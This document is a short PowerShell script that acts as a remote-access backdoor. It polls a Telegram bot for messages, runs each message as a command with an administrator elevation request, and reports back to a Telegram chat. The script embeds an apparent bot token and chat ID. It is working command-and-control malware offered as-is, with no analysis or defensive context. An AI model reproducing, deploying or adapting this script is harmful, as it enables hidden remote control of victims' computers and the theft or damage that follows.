$botToken = "8018249151:AAGaFrhjzZlRQWDFmcWQ4Hib8m8k_zrtuUc"
$chatID = "-1002312928459"

# Function to run commands silently as administrator
Function Run-Command {
    param([string]$command)
    Start-Process "powershell.exe" -ArgumentList "-Command Start-Process cmd -ArgumentList '/c $command' -Verb RunAs" -NoNewWindow -Wait
}

# Function to get the latest command from Telegram
Function Get-LatestCommand {
    $apiUrl = "https://api.telegram.org/bot$botToken/getUpdates?limit=1"
    $response = Invoke-RestMethod -Uri $apiUrl -Method Get
    return $response.result[0].message.text
}

# Function to send output back to Telegram
Function Send-Output {
    param([string]$output)
    $encodedOutput = [uri]::EscapeDataString($output)
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$encodedOutput"
    Invoke-RestMethod -Uri $url -Method Get
}

# Infinite loop to fetch and execute commands
while ($true) {
    $cmd = Get-LatestCommand
    if ($cmd -ne "") {
        Run-Command $cmd
        Send-Output "Command executed: $cmd"
    }
    Start-Sleep -Seconds 5
}
